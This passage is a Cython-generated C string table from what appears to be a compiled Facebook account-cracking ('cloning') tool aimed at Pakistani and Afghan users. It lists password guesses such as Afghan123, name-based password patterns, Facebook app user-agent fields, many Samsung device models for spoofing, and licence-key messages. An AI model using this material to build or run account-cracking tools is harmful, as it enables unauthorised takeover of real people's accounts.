    {&__pyx_kp_s_11, __pyx_k_11, sizeof(__pyx_k_11), 0, 0, 1, 0},
    {&__pyx_kp_s_1122, __pyx_k_1122, sizeof(__pyx_k_1122), 0, 0, 1, 0},
    {&__pyx_kp_s_12, __pyx_k_12, sizeof(__pyx_k_12), 0, 0, 1, 0},
    {&__pyx_kp_s_123, __pyx_k_123, sizeof(__pyx_k_123), 0, 0, 1, 0},
    {&__pyx_kp_s_1234, __pyx_k_1234, sizeof(__pyx_k_1234), 0, 0, 1, 0},
    {&__pyx_kp_s_12345, __pyx_k_12345, sizeof(__pyx_k_12345), 0, 0, 1, 0},
    {&__pyx_kp_s_13, __pyx_k_13, sizeof(__pyx_k_13), 0, 0, 1, 0},
    {&__pyx_kp_s_1_2, __pyx_k_1_2, sizeof(__pyx_k_1_2), 0, 0, 1, 0},
    {&__pyx_kp_s_1_31mTrail_Time_Has_Been_Ended, __pyx_k_1_31mTrail_Time_Has_Been_Ended, sizeof(__pyx_k_1_31mTrail_Time_Has_Been_Ended), 0, 0, 1, 0},
    {&__pyx_kp_s_1_31mYour_Key_Not_Registered_1, __pyx_k_1_31mYour_Key_Not_Registered_1, sizeof(__pyx_k_1_31mYour_Key_Not_Registered_1), 0, 0, 1, 0},
    {&__pyx_kp_s_1_31m_First_Read_Note, __pyx_k_1_31m_First_Read_Note, sizeof(__pyx_k_1_31m_First_Read_Note), 0, 0, 1, 0},
    {&__pyx_kp_s_1_31m_Your_Not_Premium_User_1_3, __pyx_k_1_31m_Your_Not_Premium_User_1_3, sizeof(__pyx_k_1_31m_Your_Not_Premium_User_1_3), 0, 0, 1, 0},
    {&__pyx_kp_s_1_32m, __pyx_k_1_32m, sizeof(__pyx_k_1_32m), 0, 0, 1, 0},
    {&__pyx_kp_s_1_32mWorking_password_for_Pakis, __pyx_k_1_32mWorking_password_for_Pakis, sizeof(__pyx_k_1_32mWorking_password_for_Pakis), 0, 0, 1, 0},
    {&__pyx_kp_s_1_32m_Out_of_Pakistan_working_p, __pyx_k_1_32m_Out_of_Pakistan_working_p, sizeof(__pyx_k_1_32m_Out_of_Pakistan_working_p), 0, 0, 1, 0},
    {&__pyx_kp_s_1_32m_ZEA_OK, __pyx_k_1_32m_ZEA_OK, sizeof(__pyx_k_1_32m_ZEA_OK), 0, 0, 1, 0},
    {&__pyx_kp_s_1_32m_ZEA_OK_s_s, __pyx_k_1_32m_ZEA_OK_s_s, sizeof(__pyx_k_1_32m_ZEA_OK_s_s), 0, 0, 1, 0},
    {&__pyx_kp_s_1_32m_exp_first123_last123_firs, __pyx_k_1_32m_exp_first123_last123_firs, sizeof(__pyx_k_1_32m_exp_first123_last123_firs), 0, 0, 1, 0},
    {&__pyx_kp_s_1_32mfor_new_ids_use_just_1_pas, __pyx_k_1_32mfor_new_ids_use_just_1_pas, sizeof(__pyx_k_1_32mfor_new_ids_use_just_1_pas), 0, 0, 1, 0},
    {&__pyx_kp_s_1_33m_Code_example_0306_0315_03, __pyx_k_1_33m_Code_example_0306_0315_03, sizeof(__pyx_k_1_33m_Code_example_0306_0315_03), 0, 0, 1, 0},
    {&__pyx_kp_s_1_33m_Code_example_077_078_070, __pyx_k_1_33m_Code_example_077_078_070, sizeof(__pyx_k_1_33m_Code_example_077_078_070), 0, 0, 1, 0},
    {&__pyx_kp_s_1_33m_ZEA_2F, __pyx_k_1_33m_ZEA_2F, sizeof(__pyx_k_1_33m_ZEA_2F), 0, 0, 1, 0},
    {&__pyx_kp_s_1_33m_example_2000_3000_5000_10, __pyx_k_1_33m_example_2000_3000_5000_10, sizeof(__pyx_k_1_33m_example_2000_3000_5000_10), 0, 0, 1, 0},
    {&__pyx_kp_s_1_34m_ZEA_2F, __pyx_k_1_34m_ZEA_2F, sizeof(__pyx_k_1_34m_ZEA_2F), 0, 0, 1, 0},
    {&__pyx_kp_s_1_36m_We_Not_Responsible_if_fac, __pyx_k_1_36m_We_Not_Responsible_if_fac, sizeof(__pyx_k_1_36m_We_Not_Responsible_if_fac), 0, 0, 1, 0},
    {&__pyx_kp_s_1_36m_ZEA_CP, __pyx_k_1_36m_ZEA_CP, sizeof(__pyx_k_1_36m_ZEA_CP), 0, 0, 1, 0},
    {&__pyx_kp_s_1_37m, __pyx_k_1_37m, sizeof(__pyx_k_1_37m), 0, 0, 1, 0},
    {&__pyx_kp_u_1_37mYour_Key, __pyx_k_1_37mYour_Key, sizeof(__pyx_k_1_37mYour_Key), 0, 1, 0, 0},
    {&__pyx_kp_s_1_37m_2, __pyx_k_1_37m_2, sizeof(__pyx_k_1_37m_2), 0, 0, 1, 0},
    {&__pyx_kp_s_1_37m_38_5_208mUse_flight_mode, __pyx_k_1_37m_38_5_208mUse_flight_mode, sizeof(__pyx_k_1_37m_38_5_208mUse_flight_mode), 0, 0, 1, 0},
    {&__pyx_kp_u_1_37m_Choice_code_1_32m, __pyx_k_1_37m_Choice_code_1_32m, sizeof(__pyx_k_1_37m_Choice_code_1_32m), 0, 1, 0, 0},
    {&__pyx_kp_u_1_37m_Choice_code_1_32m_2, __pyx_k_1_37m_Choice_code_1_32m_2, sizeof(__pyx_k_1_37m_Choice_code_1_32m_2), 0, 1, 0, 0},
    {&__pyx_kp_s_1_37m_ZEA_R_M1_s_1_37mOK_s_1_37, __pyx_k_1_37m_ZEA_R_M1_s_1_37mOK_s_1_37, sizeof(__pyx_k_1_37m_ZEA_R_M1_s_1_37mOK_s_1_37), 0, 0, 1, 0},
    {&__pyx_kp_s_1_37m_ZEA_XD_M1_s_1_37mOK_s_1_3, __pyx_k_1_37m_ZEA_XD_M1_s_1_37mOK_s_1_3, sizeof(__pyx_k_1_37m_ZEA_XD_M1_s_1_37mOK_s_1_3), 0, 0, 1, 0},
    {&__pyx_kp_s_1_37m_ZEA_XD_M2_s_1_37mOK_s_1_3, __pyx_k_1_37m_ZEA_XD_M2_s_1_37mOK_s_1_3, sizeof(__pyx_k_1_37m_ZEA_XD_M2_s_1_37mOK_s_1_3), 0, 0, 1, 0},
    {&__pyx_kp_s_1_37m_ZEA_XD_M3_s_1_37mOK_s_1_3, __pyx_k_1_37m_ZEA_XD_M3_s_1_37mOK_s_1_3, sizeof(__pyx_k_1_37m_ZEA_XD_M3_s_1_37mOK_s_1_3), 0, 0, 1, 0},
    {&__pyx_kp_s_1_37m_example_khan_ahmad_ali_1, __pyx_k_1_37m_example_khan_ahmad_ali_1, sizeof(__pyx_k_1_37m_example_khan_ahmad_ali_1), 0, 0, 1, 0},
    {&__pyx_kp_s_1_37m_example_muhammad_ali_sajj, __pyx_k_1_37m_example_muhammad_ali_sajj, sizeof(__pyx_k_1_37m_example_muhammad_ali_sajj), 0, 0, 1, 0},
    {&__pyx_kp_s_1_37m_install_modules_It_will_t, __pyx_k_1_37m_install_modules_It_will_t, sizeof(__pyx_k_1_37m_install_modules_It_will_t), 0, 0, 1, 0},
    {&__pyx_kp_s_1_37m_put_code, __pyx_k_1_37m_put_code, sizeof(__pyx_k_1_37m_put_code), 0, 0, 1, 0},
    {&__pyx_kp_s_1_93m_Please_Wait_Cloning_start, __pyx_k_1_93m_Please_Wait_Cloning_start, sizeof(__pyx_k_1_93m_Please_Wait_Cloning_start), 0, 0, 1, 0},
    {&__pyx_kp_s_1_95m_Use_flight_mode_for_speed, __pyx_k_1_95m_Use_flight_mode_for_speed, sizeof(__pyx_k_1_95m_Use_flight_mode_for_speed), 0, 0, 1, 0},
    {&__pyx_kp_s_1_97m, __pyx_k_1_97m, sizeof(__pyx_k_1_97m), 0, 0, 1, 0},
    {&__pyx_kp_s_1_Afghanistan_cloning_2_Pakista, __pyx_k_1_Afghanistan_cloning_2_Pakista, sizeof(__pyx_k_1_Afghanistan_cloning_2_Pakista), 0, 0, 1, 0},
    {&__pyx_kp_s_1_Crack_with_auto_password_2_Cr, __pyx_k_1_Crack_with_auto_password_2_Cr, sizeof(__pyx_k_1_Crack_with_auto_password_2_Cr), 0, 0, 1, 0},
    {&__pyx_kp_s_1_File_cloning_2_Random_number, __pyx_k_1_File_cloning_2_Random_number, sizeof(__pyx_k_1_File_cloning_2_Random_number), 0, 0, 1, 0},
    {&__pyx_kp_s_1_Method_2_Method_3_Method, __pyx_k_1_Method_2_Method_3_Method, sizeof(__pyx_k_1_Method_2_Method_3_Method), 0, 0, 1, 0},
    {&__pyx_kp_s_1_first_last_2_firstlast_3_firs, __pyx_k_1_first_last_2_firstlast_3_firs, sizeof(__pyx_k_1_first_last_2_firstlast_3_firs), 0, 0, 1, 0},
    {&__pyx_kp_s_1_first_last_2_firstlast_3_firs_2, __pyx_k_1_first_last_2_firstlast_3_firs_2, sizeof(__pyx_k_1_first_last_2_firstlast_3_firs_2), 0, 0, 1, 0},
    {&__pyx_kp_s_2, __pyx_k_2, sizeof(__pyx_k_2), 0, 0, 1, 0},
    {&__pyx_kp_s_210, __pyx_k_210, sizeof(__pyx_k_210), 0, 0, 1, 0},
    {&__pyx_kp_s_28, __pyx_k_28, sizeof(__pyx_k_28), 0, 0, 1, 0},
    {&__pyx_kp_s_29, __pyx_k_29, sizeof(__pyx_k_29), 0, 0, 1, 0},
    {&__pyx_kp_s_3, __pyx_k_3, sizeof(__pyx_k_3), 0, 0, 1, 0},
    {&__pyx_kp_s_350685531728_62f8ce9f74b12f84c12, __pyx_k_350685531728_62f8ce9f74b12f84c12, sizeof(__pyx_k_350685531728_62f8ce9f74b12f84c12), 0, 0, 1, 0},
    {&__pyx_kp_s_4, __pyx_k_4, sizeof(__pyx_k_4), 0, 0, 1, 0},
    {&__pyx_kp_s_5, __pyx_k_5, sizeof(__pyx_k_5), 0, 0, 1, 0},
    {&__pyx_kp_s_6, __pyx_k_6, sizeof(__pyx_k_6), 0, 0, 1, 0},
    {&__pyx_kp_s_7, __pyx_k_7, sizeof(__pyx_k_7), 0, 0, 1, 0},
    {&__pyx_kp_s_786, __pyx_k_786, sizeof(__pyx_k_786), 0, 0, 1, 0},
    {&__pyx_kp_s_8, __pyx_k_8, sizeof(__pyx_k_8), 0, 0, 1, 0},
    {&__pyx_kp_s_9, __pyx_k_9, sizeof(__pyx_k_9), 0, 0, 1, 0},
    {&__pyx_kp_s_980, __pyx_k_980, sizeof(__pyx_k_980), 0, 0, 1, 0},
    {&__pyx_kp_s_9_0_1, __pyx_k_9_0_1, sizeof(__pyx_k_9_0_1), 0, 0, 1, 0},
    {&__pyx_kp_s_9_FBOP_1_FBCA, __pyx_k_9_FBOP_1_FBCA, sizeof(__pyx_k_9_FBOP_1_FBCA), 0, 0, 1, 0},
    {&__pyx_n_s_A, __pyx_k_A, sizeof(__pyx_k_A), 0, 0, 1, 1},
    {&__pyx_kp_s_Accept_Encoding, __pyx_k_Accept_Encoding, sizeof(__pyx_k_Accept_Encoding), 0, 0, 1, 0},
    {&__pyx_n_s_Afghan123, __pyx_k_Afghan123, sizeof(__pyx_k_Afghan123), 0, 0, 1, 1},
    {&__pyx_n_s_Afghan1234, __pyx_k_Afghan1234, sizeof(__pyx_k_Afghan1234), 0, 0, 1, 1},
    {&__pyx_n_s_Afghan12345, __pyx_k_Afghan12345, sizeof(__pyx_k_Afghan12345), 0, 0, 1, 1},
    {&__pyx_n_s_Android, __pyx_k_Android, sizeof(__pyx_k_Android), 0, 0, 1, 1},
    {&__pyx_kp_s_AppleWebKit_537_36_KHTML_like_Ge, __pyx_k_AppleWebKit_537_36_KHTML_like_Ge, sizeof(__pyx_k_AppleWebKit_537_36_KHTML_like_Ge), 0, 0, 1, 0},
    {&__pyx_kp_s_AppleWebKit_537_36_KHTML_like_Ge_2, __pyx_k_AppleWebKit_537_36_KHTML_like_Ge_2, sizeof(__pyx_k_AppleWebKit_537_36_KHTML_like_Ge_2), 0, 0, 1, 0},
    {&__pyx_n_s_Authorization, __pyx_k_Authorization, sizeof(__pyx_k_Authorization), 0, 0, 1, 1},
    {&__pyx_n_s_B, __pyx_k_B, sizeof(__pyx_k_B), 0, 0, 1, 1},
    {&__pyx_kp_s_Build, __pyx_k_Build, sizeof(__pyx_k_Build), 0, 0, 1, 0},
    {&__pyx_n_s_C, __pyx_k_C, sizeof(__pyx_k_C), 0, 0, 1, 1},
    {&__pyx_kp_s_Choose, __pyx_k_Choose, sizeof(__pyx_k_Choose), 0, 0, 1, 0},
    {&__pyx_kp_s_Choose_Option, __pyx_k_Choose_Option, sizeof(__pyx_k_Choose_Option), 0, 0, 1, 0},
    {&__pyx_kp_s_Choose_an_option, __pyx_k_Choose_an_option, sizeof(__pyx_k_Choose_an_option), 0, 0, 1, 0},
    {&__pyx_n_s_ConnectionError, __pyx_k_ConnectionError, sizeof(__pyx_k_ConnectionError), 0, 0, 1, 1},
    {&__pyx_kp_s_Content_Type, __pyx_k_Content_Type, sizeof(__pyx_k_Content_Type), 0, 0, 1, 0},
    {&__pyx_n_s_D, __pyx_k_D, sizeof(__pyx_k_D), 0, 0, 1, 1},
    {&__pyx_kp_s_Davik_2_1_0_Linux_U_Android, __pyx_k_Davik_2_1_0_Linux_U_Android, sizeof(__pyx_k_Davik_2_1_0_Linux_U_Android), 0, 0, 1, 0},
    {&__pyx_kp_s_Do_you_went_show_cp_account_y_n, __pyx_k_Do_you_went_show_cp_account_y_n, sizeof(__pyx_k_Do_you_went_show_cp_account_y_n), 0, 0, 1, 0},
    {&__pyx_n_s_Dsj9JMWoixk4Qsje0Ng3nA, __pyx_k_Dsj9JMWoixk4Qsje0Ng3nA, sizeof(__pyx_k_Dsj9JMWoixk4Qsje0Ng3nA), 0, 0, 1, 1},
    {&__pyx_n_s_E, __pyx_k_E, sizeof(__pyx_k_E), 0, 0, 1, 1},
    {&__pyx_kp_s_Enter_your_Name, __pyx_k_Enter_your_Name, sizeof(__pyx_k_Enter_your_Name), 0, 0, 1, 0},
    {&__pyx_kp_s_Example_gmail_com_yahoo_com_etc, __pyx_k_Example_gmail_com_yahoo_com_etc, sizeof(__pyx_k_Example_gmail_com_yahoo_com_etc), 0, 0, 1, 0},
    {&__pyx_kp_s_Expect_an_SMS, __pyx_k_Expect_an_SMS, sizeof(__pyx_k_Expect_an_SMS), 0, 0, 1, 0},
    {&__pyx_n_s_F, __pyx_k_F, sizeof(__pyx_k_F), 0, 0, 1, 1},
    {&__pyx_n_s_FB4A, __pyx_k_FB4A, sizeof(__pyx_k_FB4A), 0, 0, 1, 1},
    {&__pyx_kp_s_FBAN, __pyx_k_FBAN, sizeof(__pyx_k_FBAN), 0, 0, 1, 0},
    {&__pyx_kp_s_FBAV, __pyx_k_FBAV, sizeof(__pyx_k_FBAV), 0, 0, 1, 0},
    {&__pyx_kp_s_FBBD, __pyx_k_FBBD, sizeof(__pyx_k_FBBD), 0, 0, 1, 0},
    {&__pyx_kp_s_FBBV, __pyx_k_FBBV, sizeof(__pyx_k_FBBV), 0, 0, 1, 0},
    {&__pyx_kp_s_FBCR, __pyx_k_FBCR, sizeof(__pyx_k_FBCR), 0, 0, 1, 0},
    {&__pyx_kp_s_FBDM, __pyx_k_FBDM, sizeof(__pyx_k_FBDM), 0, 0, 1, 0},
    {&__pyx_kp_s_FBDM_density_2_625_width_1080_h, __pyx_k_FBDM_density_2_625_width_1080_h, sizeof(__pyx_k_FBDM_density_2_625_width_1080_h), 0, 0, 1, 0},
    {&__pyx_kp_s_FBDV, __pyx_k_FBDV, sizeof(__pyx_k_FBDV), 0, 0, 1, 0},
    {&__pyx_kp_s_FBMF, __pyx_k_FBMF, sizeof(__pyx_k_FBMF), 0, 0, 1, 0},
    {&__pyx_kp_s_FBOP_19_FBCA, __pyx_k_FBOP_19_FBCA, sizeof(__pyx_k_FBOP_19_FBCA), 0, 0, 1, 0},
    {&__pyx_kp_s_FBPN, __pyx_k_FBPN, sizeof(__pyx_k_FBPN), 0, 0, 1, 0},
    {&__pyx_kp_s_FBRV, __pyx_k_FBRV, sizeof(__pyx_k_FBRV), 0, 0, 1, 0},
    {&__pyx_kp_s_FBSV, __pyx_k_FBSV, sizeof(__pyx_k_FBSV), 0, 0, 1, 0},
    {&__pyx_n_s_FileNotFoundError, __pyx_k_FileNotFoundError, sizeof(__pyx_k_FileNotFoundError), 0, 0, 1, 1},
    {&__pyx_kp_s_File_crack_Create_ids_file_Publ, __pyx_k_File_crack_Create_ids_file_Publ, sizeof(__pyx_k_File_crack_Create_ids_file_Publ), 0, 0, 1, 0},
    {&__pyx_kp_s_File_location_not_found, __pyx_k_File_location_not_found, sizeof(__pyx_k_File_location_not_found), 0, 0, 1, 0},
    {&__pyx_n_s_First, __pyx_k_First, sizeof(__pyx_k_First), 0, 0, 1, 1},
    {&__pyx_n_s_G, __pyx_k_G, sizeof(__pyx_k_G), 0, 0, 1, 1},
    {&__pyx_kp_s_GT_1015, __pyx_k_GT_1015, sizeof(__pyx_k_GT_1015), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_1020, __pyx_k_GT_1020, sizeof(__pyx_k_GT_1020), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_1030, __pyx_k_GT_1030, sizeof(__pyx_k_GT_1030), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_1035, __pyx_k_GT_1035, sizeof(__pyx_k_GT_1035), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_1040, __pyx_k_GT_1040, sizeof(__pyx_k_GT_1040), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_1045, __pyx_k_GT_1045, sizeof(__pyx_k_GT_1045), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_1050, __pyx_k_GT_1050, sizeof(__pyx_k_GT_1050), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_1240, __pyx_k_GT_1240, sizeof(__pyx_k_GT_1240), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_1440, __pyx_k_GT_1440, sizeof(__pyx_k_GT_1440), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_1450, __pyx_k_GT_1450, sizeof(__pyx_k_GT_1450), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_18190, __pyx_k_GT_18190, sizeof(__pyx_k_GT_18190), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_18262, __pyx_k_GT_18262, sizeof(__pyx_k_GT_18262), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_19060I, __pyx_k_GT_19060I, sizeof(__pyx_k_GT_19060I), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_19082, __pyx_k_GT_19082, sizeof(__pyx_k_GT_19082), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_19083, __pyx_k_GT_19083, sizeof(__pyx_k_GT_19083), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_19105, __pyx_k_GT_19105, sizeof(__pyx_k_GT_19105), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_19152, __pyx_k_GT_19152, sizeof(__pyx_k_GT_19152), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_19192, __pyx_k_GT_19192, sizeof(__pyx_k_GT_19192), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_19300, __pyx_k_GT_19300, sizeof(__pyx_k_GT_19300), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_19505, __pyx_k_GT_19505, sizeof(__pyx_k_GT_19505), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_2000, __pyx_k_GT_2000, sizeof(__pyx_k_GT_2000), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_20000, __pyx_k_GT_20000, sizeof(__pyx_k_GT_20000), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_200s, __pyx_k_GT_200s, sizeof(__pyx_k_GT_200s), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_3000, __pyx_k_GT_3000, sizeof(__pyx_k_GT_3000), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_414XOP, __pyx_k_GT_414XOP, sizeof(__pyx_k_GT_414XOP), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_6918, __pyx_k_GT_6918, sizeof(__pyx_k_GT_6918), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_7010, __pyx_k_GT_7010, sizeof(__pyx_k_GT_7010), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_7020, __pyx_k_GT_7020, sizeof(__pyx_k_GT_7020), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_7030, __pyx_k_GT_7030, sizeof(__pyx_k_GT_7030), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_7040, __pyx_k_GT_7040, sizeof(__pyx_k_GT_7040), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_7050, __pyx_k_GT_7050, sizeof(__pyx_k_GT_7050), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_7100, __pyx_k_GT_7100, sizeof(__pyx_k_GT_7100), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_7105, __pyx_k_GT_7105, sizeof(__pyx_k_GT_7105), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_7110, __pyx_k_GT_7110, sizeof(__pyx_k_GT_7110), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_7205, __pyx_k_GT_7205, sizeof(__pyx_k_GT_7205), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_7210, __pyx_k_GT_7210, sizeof(__pyx_k_GT_7210), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_7240R, __pyx_k_GT_7240R, sizeof(__pyx_k_GT_7240R), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_7245, __pyx_k_GT_7245, sizeof(__pyx_k_GT_7245), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_7303, __pyx_k_GT_7303, sizeof(__pyx_k_GT_7303), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_7310, __pyx_k_GT_7310, sizeof(__pyx_k_GT_7310), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_7320, __pyx_k_GT_7320, sizeof(__pyx_k_GT_7320), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_7325, __pyx_k_GT_7325, sizeof(__pyx_k_GT_7325), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_7326, __pyx_k_GT_7326, sizeof(__pyx_k_GT_7326), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_7340, __pyx_k_GT_7340, sizeof(__pyx_k_GT_7340), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_7405, __pyx_k_GT_7405, sizeof(__pyx_k_GT_7405), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_7550_5GT_8005, __pyx_k_GT_7550_5GT_8005, sizeof(__pyx_k_GT_7550_5GT_8005), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_8010, __pyx_k_GT_8010, sizeof(__pyx_k_GT_8010), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_81, __pyx_k_GT_81, sizeof(__pyx_k_GT_81), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_810, __pyx_k_GT_810, sizeof(__pyx_k_GT_810), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_8105, __pyx_k_GT_8105, sizeof(__pyx_k_GT_8105), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_8110, __pyx_k_GT_8110, sizeof(__pyx_k_GT_8110), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_8220S, __pyx_k_GT_8220S, sizeof(__pyx_k_GT_8220S), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_8410, __pyx_k_GT_8410, sizeof(__pyx_k_GT_8410), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_9300, __pyx_k_GT_9300, sizeof(__pyx_k_GT_9300), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_9320, __pyx_k_GT_9320, sizeof(__pyx_k_GT_9320), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_93G, __pyx_k_GT_93G, sizeof(__pyx_k_GT_93G), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_A7100, __pyx_k_GT_A7100, sizeof(__pyx_k_GT_A7100), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_A9500, __pyx_k_GT_A9500, sizeof(__pyx_k_GT_A9500), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_ANDROID, __pyx_k_GT_ANDROID, sizeof(__pyx_k_GT_ANDROID), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_B2710, __pyx_k_GT_B2710, sizeof(__pyx_k_GT_B2710), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_B5330, __pyx_k_GT_B5330, sizeof(__pyx_k_GT_B5330), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_B5330B, __pyx_k_GT_B5330B, sizeof(__pyx_k_GT_B5330B), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_B5330L, __pyx_k_GT_B5330L, sizeof(__pyx_k_GT_B5330L), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_B5330ZKAINU, __pyx_k_GT_B5330ZKAINU, sizeof(__pyx_k_GT_B5330ZKAINU), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_B5510, __pyx_k_GT_B5510, sizeof(__pyx_k_GT_B5510), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_B5512, __pyx_k_GT_B5512, sizeof(__pyx_k_GT_B5512), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_B5722, __pyx_k_GT_B5722, sizeof(__pyx_k_GT_B5722), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_B7510, __pyx_k_GT_B7510, sizeof(__pyx_k_GT_B7510), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_B7722, __pyx_k_GT_B7722, sizeof(__pyx_k_GT_B7722), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_B7810, __pyx_k_GT_B7810, sizeof(__pyx_k_GT_B7810), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_B9150, __pyx_k_GT_B9150, sizeof(__pyx_k_GT_B9150), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_B9388, __pyx_k_GT_B9388, sizeof(__pyx_k_GT_B9388), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_C3010, __pyx_k_GT_C3010, sizeof(__pyx_k_GT_C3010), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_C3262, __pyx_k_GT_C3262, sizeof(__pyx_k_GT_C3262), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_C3310R, __pyx_k_GT_C3310R, sizeof(__pyx_k_GT_C3310R), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_C3312, __pyx_k_GT_C3312, sizeof(__pyx_k_GT_C3312), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_C3312R, __pyx_k_GT_C3312R, sizeof(__pyx_k_GT_C3312R), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_C3313T, __pyx_k_GT_C3313T, sizeof(__pyx_k_GT_C3313T), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_C3322, __pyx_k_GT_C3322, sizeof(__pyx_k_GT_C3322), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_C3322i, __pyx_k_GT_C3322i, sizeof(__pyx_k_GT_C3322i), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_C3520, __pyx_k_GT_C3520, sizeof(__pyx_k_GT_C3520), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_C3520I, __pyx_k_GT_C3520I, sizeof(__pyx_k_GT_C3520I), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_C3592, __pyx_k_GT_C3592, sizeof(__pyx_k_GT_C3592), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_C3595, __pyx_k_GT_C3595, sizeof(__pyx_k_GT_C3595), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_C3782, __pyx_k_GT_C3782, sizeof(__pyx_k_GT_C3782), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_C6712, __pyx_k_GT_C6712, sizeof(__pyx_k_GT_C6712), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_E1282T, __pyx_k_GT_E1282T, sizeof(__pyx_k_GT_E1282T), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_E1500, __pyx_k_GT_E1500, sizeof(__pyx_k_GT_E1500), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_E2200, __pyx_k_GT_E2200, sizeof(__pyx_k_GT_E2200), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_E2202, __pyx_k_GT_E2202, sizeof(__pyx_k_GT_E2202), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_E2250, __pyx_k_GT_E2250, sizeof(__pyx_k_GT_E2250), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_E2252, __pyx_k_GT_E2252, sizeof(__pyx_k_GT_E2252), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_E2600, __pyx_k_GT_E2600, sizeof(__pyx_k_GT_E2600), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_E2652W, __pyx_k_GT_E2652W, sizeof(__pyx_k_GT_E2652W), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_E3210, __pyx_k_GT_E3210, sizeof(__pyx_k_GT_E3210), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_E3309, __pyx_k_GT_E3309, sizeof(__pyx_k_GT_E3309), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_E3309I, __pyx_k_GT_E3309I, sizeof(__pyx_k_GT_E3309I), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_E3309T, __pyx_k_GT_E3309T, sizeof(__pyx_k_GT_E3309T), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_G530H, __pyx_k_GT_G530H, sizeof(__pyx_k_GT_G530H), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_G930F, __pyx_k_GT_G930F, sizeof(__pyx_k_GT_G930F), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_H9500, __pyx_k_GT_H9500, sizeof(__pyx_k_GT_H9500), 0, 0, 1, 0},
